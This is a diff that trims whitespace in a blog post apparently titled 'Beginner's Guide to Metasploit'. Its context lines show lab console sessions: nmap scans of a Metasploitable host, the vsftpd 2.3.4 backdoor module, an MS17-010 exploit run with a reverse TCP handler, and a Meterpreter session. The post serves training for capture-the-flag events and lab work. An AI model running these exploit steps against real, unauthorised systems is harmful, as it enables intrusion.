@@ -3,13 +3,14 @@ layout: post
 title: Beginner's Guide to Metasploit
 excerpt_separator: <!--more-->
 categories: [Beginner, Instructional, Metasploit]
+skip_toc: false
 ---
 
 
 ## Introduction
 
 As you probably already know, Metasploit is an amazing tool/framework for offensive exercises, audits, and penetration tests. It includes functionality for exploit development and integration of plugins from all sorts of other tools. I built this guide in early 2020 to aide co-workers in understanding its functionality and help them in experimenting with in on CTF events and online cyber challenges, so I hope it's useful to others here interested in understanding the basics and building from there. For further reading, check the sources at the bottom of the guide!
-    
+
 
 ```bash
 msfconsole [options]
@@ -125,7 +126,7 @@ MSF tries to keep modules sorted by type (such as exploit), then Operating Syste
 
 ```
 ❯ msfconsole
-                                                  
+
      ,           ,
     /             \
    ((__---,,,---__))
@@ -178,8 +179,8 @@ NSE: Script Pre-scanning.
 PORT     STATE SERVICE     REASON         VERSION
 21/tcp   open  ftp         syn-ack ttl 64 vsftpd 2.3.4
 |_ftp-anon: Anonymous FTP login allowed (FTP code 230)
-| ftp-syst: 
-|   STAT: 
+| ftp-syst:
+|   STAT:
 | FTP server status:
 |      Connected to 192.168.86.37
 |      Logged in as ftp
@@ -205,10 +206,10 @@ OS details: Linux 2.6.9 - 2.6.33
 And this appears to be backed up my nmap's `smb-os-discovery` script a bit further down:
 
 ```
-| smb-os-discovery: 
+| smb-os-discovery:
 |   OS: Unix (Samba 3.0.20-Debian)
 |   Computer name: metasploitable
-|   NetBIOS computer name: 
+|   NetBIOS computer name:
 |   Domain name: localdomain
 |   FQDN: metasploitable.localdomain
 |_  System time: 2020-05-15T07:15:51-04:00
@@ -232,7 +233,7 @@ Nope, not there.  Let's check exploit/unix instead:
 
 ```
 msf5 > use exploit/unix/
-Display all 195 possibilities? (y or n) 
+Display all 195 possibilities? (y or n)
 ```
 
 Now, let's try exploit/unix/ftp since 195 is way too many:
@@ -258,10 +259,10 @@ msf5 > info
   Disclosed: 2011-07-03
 ...
 Description:
-  This module exploits a malicious backdoor that was added to the 
-  VSFTPD download archive. This backdoor was introduced into the 
-  vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 
-  according to the most recent information available. This backdoor 
+  This module exploits a malicious backdoor that was added to the
+  VSFTPD download archive. This backdoor was introduced into the
+  vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011
+  according to the most recent information available. This backdoor
   was removed on July 3rd 2011.
 ...
 ```
@@ -298,7 +299,7 @@ Matching Modules
    #  Name                                  Disclosure Date  Rank       Check  Description
    -  ----                                  ---------------  ----       -----  -----------
    0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
-   
+
 msf5 > use 0
 msf5 exploit(unix/ftp/vsftpd_234_backdoor) >
 ```
@@ -427,7 +428,7 @@ Exploit target:
    Id  Name
    --  ----
    0   Windows 7 and Server 2008 R2 (x64) All Service Packs
-   
+
 msf5 > run
 [*] Started reverse TCP handler on 10.2.8.137:4444
 [*] 10.10.214.103:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
@@ -538,7 +539,7 @@ msf5 > sessions -u 1
 [*] Stopping exploit/multi/handler
 [*] Starting interaction with 2...
 
-meterpreter > 
+meterpreter >
 ```
 
 With a Meterpreter shell, you can now do all sorts of things on the target, provided the process Meterpreter is attached to has high enough permissions.  We'll get into all the different functionality available with Meterpreter in another document, but you can check out [Offensive Security's in-depth chapter on Meterpreter here](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/).
@@ -596,7 +597,7 @@ current  name     hosts  services  vulns  creds  loots  notes
 
 
 
-For a list of commands that pull data from the database or add data to the database, type `? database`. 
+For a list of commands that pull data from the database or add data to the database, type `? database`.
 
 ```
 msf5 > ? database
